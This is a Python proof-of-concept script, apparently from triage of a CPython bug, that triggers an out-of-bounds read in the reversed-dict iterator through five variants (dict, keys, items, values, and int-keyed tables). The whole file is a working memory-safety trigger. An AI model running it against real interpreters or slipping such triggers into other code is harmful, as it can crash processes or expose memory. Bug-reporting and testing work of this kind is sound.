"""Which entry points reach dictreviter_iter_lock_held's unbounded read.

All five reverse iterators share dictreviter_iternext -> dictreviter_iter_lock_held,
and dictiter_new() seeds di_pos from load_keys_nentries(dict) - 1 for every one of
them (Objects/dictobject.c:5629-5637).

Usage: reversed_dict_oob_variants.py <variant> [N]
  variant in: dict, keys, items, values, general
    dict     -> reversed(d)
    keys     -> reversed(d.keys())
    items    -> reversed(d.items())
    values   -> reversed(d.values())
    general  -> reversed(d) on a DICT_KEYS_GENERAL table (int keys), hitting
                the DK_ENTRIES branch at :6294 instead of :6283
"""

import sys

variant = sys.argv[1] if len(sys.argv) > 1 else "dict"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 60000


def build(keyfn):
    d = {}
    for i in range(N):
        d[keyfn(i)] = i
    for i in range(N - 1):
        del d[keyfn(i)]
    return d


def main():
    if variant == "general":
        d = build(lambda i: i)  # int keys -> DICT_KEYS_GENERAL
        it = reversed(d)
        d.clear()
        d[0] = 1
    else:
        d = build(lambda i: "k%d" % i)
        if variant == "dict":
            it = reversed(d)
        elif variant == "keys":
            it = reversed(d.keys())
        elif variant == "items":
            it = reversed(d.items())
        elif variant == "values":
            it = reversed(d.values())
        else:
            raise SystemExit("unknown variant %r" % variant)
        d.clear()
        d["z"] = 1

    print("[%s] next(it)" % variant, flush=True)
    got = next(it)
    print("[%s] survived ->" % variant, repr(got), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
